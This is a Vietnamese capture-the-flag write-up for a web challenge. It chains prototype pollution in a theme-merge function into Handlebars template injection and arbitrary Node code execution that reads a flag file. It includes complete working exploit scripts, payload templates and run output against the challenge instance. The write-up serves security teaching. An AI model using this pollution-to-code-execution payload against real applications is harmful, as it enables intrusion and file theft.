---
title: "Do You Know Lika?"
category: "Web"
tags: ["handlebars", "prototype-pollution", "ssti", "node.js", "permission-model", "file-read"]
solve_date: "2026-10-10"
language: "vi"
---

# Do You Know Lika?

**Flag:** `FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}`
**Dịch vụ:** `https://do-you-know-lika-01bae347bde5.inst9.ctf.fortid.com`, endpoint `POST /api/preview`. **Artifact:** `handout.zip` (16 KB), chứa `src/server.js` (6471 B), `src/worker.js` (2579 B), `src/templates/postcard-layout.hbs` (91 B), `package.json` và `flag.txt` (17 B).

## Đề bài

> The Lika Tourist Board has launched a postcard designer for visitors who think they know the region. Pick a theme, fill in the postcard data, and let a fresh print worker process prepare a preview.
>
> Can you print the ranger's secret?

Người chơi gửi JSON tới `/api/preview` với ba trường `template`, `theme`, `model`. `server.js` kiểm request rồi spawn một tiến trình Node mới chạy `src/worker.js` cho mỗi lượt in.

Hai placeholder cần loại trừ ngay từ đầu: `flag.txt` trong handout (17 B) chứa `FortID{redacted}`, là giá trị mẫu mà `entrypoint` thay bằng `FLAG`; và `server.js:203` có `const flag = process.env.FLAG || "FortID{development_flag}";` — `FortID{development_flag}` là default khi chạy dev, không phải cờ.

## Phân tích

**Đường render.** `worker.js:52-77` compile `job.template` bằng Handlebars rồi gọi với:

```js
return template({ ...job.model, theme }, {
  data: rootData,
  partials: safePartials,
  allowProtoMethodsByDefault: false,
  allowProtoPropertiesByDefault: false,
});
```

Template do người chơi cung cấp được compile. Hai tuỳ chọn mặc định ngăn truy cập prototype khi không có allowlist cho method cụ thể; payload dưới đây làm thay đổi allowlist đó.

`validateJob` (`server.js:49-79`) chặn `__proto__` theo tên, kiểm tra đệ quy qua `containsBlockedKey`, và chặn một số cú pháp partial: mở partial động (delimiter mở ngay sau là dấu `> (`), khai báo inline layout (delimiter mở ngay sau là `#*inline`), cùng danh sách trắng tên partial. Nó không đụng tới template nói chung.

**Vòng ô nhiễm.** `worker.js:13-23` merge theme bằng:

```js
function mergeTheme(target, source) {
  for (const [key, value] of Object.entries(source)) {
    if (value !== null && typeof value === "object") {
      target[key] ??= Array.isArray(value) ? [] : {};
      mergeTheme(target[key], value);
    } else {
      target[key] = value;
    }
  }
  return target;
}
```

Với `theme = {"constructor":{"prototype":{"allowedProtoMethods":{...}}}}`:

- `target` khởi đầu là `{}`, nên `target["constructor"]` đã tồn tại qua chuỗi prototype (trả về `Object`), `??=` không ghi đè, và lời gọi đệ quy đi thẳng vào **hàm `Object`**.
- Tương tự `Object["prototype"]` đã tồn tại, nên đệ quy lần hai đi vào `Object.prototype`.
- Phép gán cuối cùng đặt `Object.prototype.allowedProtoMethods` thành `{constructor: true, apply: true, call: true}`.

Server chỉ chặn đúng key `__proto__`; chuỗi `constructor` → `prototype` tới được cùng một đối tượng.

**Vì sao nó bật lại cổng Handlebars.** Handlebars dựng bảng trắng method từ chính options object:

```js
methods: {
  whitelist: createNewLookupObject(defaultMethodWhiteList, runtimeOptions.allowedProtoMethods),
  defaultValue: runtimeOptions.allowProtoMethodsByDefault
}
```

`createProtoAccessControl(runtimeOptions)` (`lib/handlebars/internal/proto-access.js`) đọc `runtimeOptions.allowedProtoMethods` — một key mà `worker.js` **không** set. Sau bước ô nhiễm, phép đọc đó rơi xuống `Object.prototype.allowedProtoMethods` và trả về object vừa được nhồi. `createNewLookupObject` merge nó vào `defaultMethodWhiteList` (vốn set `constructor: false`), nên `constructor`, `apply`, `call` trở thành method hợp lệ với `whitelist[name] === true`.

Tóm lại: `allowProtoMethodsByDefault: false` vẫn còn đó, nhưng bảng trắng per-method đã bị người chơi cung cấp.

**Chuỗi primitive.** Với bảng trắng đã bật, ba bước trong template (`OB`/`CB` ở dưới là hai ký tự mở/đóng của Handlebars, viết kiểu escape để bài này không chứa delimiter thô):

```text
OBsetLayoutOption @root.o key="title" value=(lookup (lookup "a" "constructor") "constructor")CB
OB#each @root.oCBsetLayoutOption @root.o2 key="title" value=(apply "" @root.c1)CBOB/eachCB
OB#each @root.o2CB{apply "" @root.c2}CBOB/eachCB
```

- `lookup "a" "constructor"` cho `String`; `lookup String "constructor"` cho `Function`. Giá trị này được `setLayoutOption` (`worker.js:33-46`) ghi vào `@root.o.title` — helper cho ghi ba key `title`/`accent`/`caption` lên object `target`, nên đây là kênh lưu đối tượng.
- `#each @root.o` duyệt giá trị own-property của `o`, tức context trong block chính là `Function`. Trong context đó `(apply "" @root.c1)` phân giải thành `Function.prototype.apply` gọi trên `Function` với `thisArg = ""` và argsArray `[CODE]` — tương đương `Function(CODE)`, tức biên dịch một hàm mới từ chuỗi `model.c1[0]`. Kết quả được ghi vào `@root.o2.title`.
- Block `#each @root.o2` thứ hai có context là hàm vừa biên dịch; stache ba lớp cho `apply "" @root.c2` với `c2 = []` tương đương `fn.apply("", [])`, tức **gọi hàm**. Dạng stache ba lớp in giá trị trả về thô, không escape.

Code chạy trong tiến trình print worker, được spawn với:

```js
const WORKER_ARGUMENTS = [
  "--permission",
  "--allow-fs-read=/challenge",
  "--allow-fs-read=/tmp/lika/flag.txt",
  "--max-old-space-size=48",
  WORKER,
];
```

và `env` truyền `FLAG_PATH=/tmp/lika/flag.txt`. Worker được phép đọc `/challenge` và file cờ đã chỉ định, nên payload chỉ cần đọc file đó:

```js
return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')
```

`process.mainModule.require` được dùng thay `require` vì thân hàm tạo bởi `new Function` không nằm trong module scope. `prepareFlag()` cũng `delete process.env.FLAG` (`server.js:205`), nên cờ chỉ còn trong file — không có đường tắt qua biến môi trường.

## Lời giải

Kiểm chứng cục bộ trước. `server.js` và `worker.js` đều export hàm, nên có thể gọi thẳng `validateJob` + `render` mà không cần dựng container:

```js
"use strict";
const path = require("path");
const { render } = require(path.join(__dirname, "..", "handout", "do_you_know_lika", "src", "worker.js"));
const { validateJob } = require(path.join(__dirname, "..", "handout", "do_you_know_lika", "src", "server.js"));
const CODE = process.argv[2] || "return 7*7";
const OB = "\u007b\u007b", CB = "\u007d\u007d";
const theme = { constructor: { prototype: { allowedProtoMethods: { constructor: true, apply: true, call: true } } } };
const template =
  OB + 'setLayoutOption @root.o key="title" value=(lookup (lookup "a" "constructor") "constructor")' + CB +
  OB + '#each @root.o' + CB + OB + 'setLayoutOption @root.o2 key="title" value=(apply "" @root.c1)' + CB + OB + '/each' + CB +
  OB + '#each @root.o2' + CB + OB + '{apply "" @root.c2}' + CB + OB + '/each' + CB;
const job = { template, theme, model: { o: {}, o2: {}, c1: [CODE], c2: [] } };
console.log("validateJob:", validateJob(job));
try { console.log("OUTPUT:", JSON.stringify(render(job))); } catch (e) { console.log("ERR:", e.message); }
```

```console
$ node stage.js "return 7*7"
```

```text
validateJob: null
OUTPUT: "49"
```

```console
$ FLAG_PATH=$PWD/fakeflag.txt node stage.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH,'utf8')"
```

```text
validateJob: null
OUTPUT: "FortID{local_test_flag_not_real}\n"
```

`FortID{local_test_flag_not_real}` là nội dung `scratch/fakeflag.txt` do tự tay tạo để test đường đọc file; đây là placeholder cục bộ, không phải cờ. Chạy cục bộ gọi `render()` ngay trong process nên không có `--permission`; vì vậy phải tự trỏ `FLAG_PATH` tới một file cục bộ.

Client gửi lên instance thật, dùng đúng template đã kiểm chứng ở trên:

```js
"use strict";
const URL_BASE = "https://do-you-know-lika-01bae347bde5.inst9.ctf.fortid.com";
const CODE = process.argv[2];
// OB/CB are the Handlebars delimiters, written as escapes so this file holds no literal markers.
const OB = "\u007b\u007b", CB = "\u007d\u007d";
const theme = { constructor: { prototype: { allowedProtoMethods: { constructor: true, apply: true, call: true } } } };
const template =
  OB + 'setLayoutOption @root.o key="title" value=(lookup (lookup "a" "constructor") "constructor")' + CB +
  OB + '#each @root.o' + CB + OB + 'setLayoutOption @root.o2 key="title" value=(apply "" @root.c1)' + CB + OB + '/each' + CB +
  OB + '#each @root.o2' + CB + OB + '{apply "" @root.c2}' + CB + OB + '/each' + CB;
const body = JSON.stringify({ template, theme, model: { o: {}, o2: {}, c1: [CODE], c2: [] } });
fetch(URL_BASE + "/api/preview", {
  method: "POST",
  headers: { "Content-Type": "application/json" },
  body,
}).then(async r => console.log(r.status, (await r.text()).slice(0, 4000)))
  .catch(e => console.log("NETERR:", e.message));
```

Probe đầu tiên chỉ chứng minh quyền thực thi code trong worker:

```console
$ node remote.js "return 7*7"
```

```text
200 {"ok":true,"output":"49"}
```

Đọc cờ:

```console
$ node remote.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')"
```

```text
200 {"ok":true,"output":"FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}\n"}
```

`\n` cuối là do `prepareFlag()` ghi `${flag}\n` (`server.js:204`), không phải một phần của cờ.

## Kết quả

```text
FortID{L1K4_41R_1S_50_FR35H_Y0U_C4N_T45T3_TH3_P0LLUT10N_abbe7f195b}
```

Cờ đọc trực tiếp từ dịch vụ đề bài. Chưa lưu phản hồi submission.

## Tái hiện

Cần Node.js (đã kiểm trên v24), `unzip`, và dependency của handout (`express@4.21.2`, `handlebars@4.7.8`). Phần dựng payload chạy được hoàn toàn local; chỉ hai request `7*7` và đọc cờ cần instance đang sống.

```console
$ mkdir -p lika-work/scratch
$ unzip handout.zip -d lika-work/handout
$ cd lika-work/handout/do_you_know_lika && npm ci --omit=dev && cd ../../..
```

`handout.zip` giải nén ra thư mục `do_you_know_lika/`, nên `unzip -d lika-work/handout` tạo đúng layout `lika-work/handout/do_you_know_lika/src/...`. Lưu block JS thứ nhất thành `lika-work/scratch/stage.js` và block thứ hai thành `lika-work/scratch/remote.js`; hai đường dẫn `require` trong `stage.js` đã trỏ sẵn tới `../handout/do_you_know_lika/src/...`. Tạo file test và chạy:

```console
$ printf 'FortID{local_test_flag_not_real}\n' > fakeflag.txt
$ node stage.js "return 7*7"
$ FLAG_PATH=$PWD/fakeflag.txt node stage.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH,'utf8')"
$ node remote.js "return 7*7"
$ node remote.js "return process.mainModule.require('fs').readFileSync(process.env.FLAG_PATH||'/tmp/lika/flag.txt','utf8')"
```

Tuỳ chọn, dựng service local bằng Docker theo README của handout:

```console
$ docker build -t do-you-know-lika -f deploy/Dockerfile .
$ docker run --rm -p 8080:8080 --read-only --tmpfs /tmp:rw,noexec,nosuid,nodev,size=16m \
    --cap-drop ALL --security-opt no-new-privileges:true --memory 128m --cpus 0.5 --pids-limit 48 \
    -e 'FLAG=FortID{local_not_real}' do-you-know-lika
```

Các hằng `OB`/`CB` trong script là ký tự escape `\u007b\u007b` và `\u007d\u007d`; chuỗi `template` dựng lúc chạy dài 237 ký tự và trùng từng byte với template gốc đã gửi lên instance, nên payload không đổi. Nếu instance đổi hostname, chỉ cần sửa `URL_BASE`.
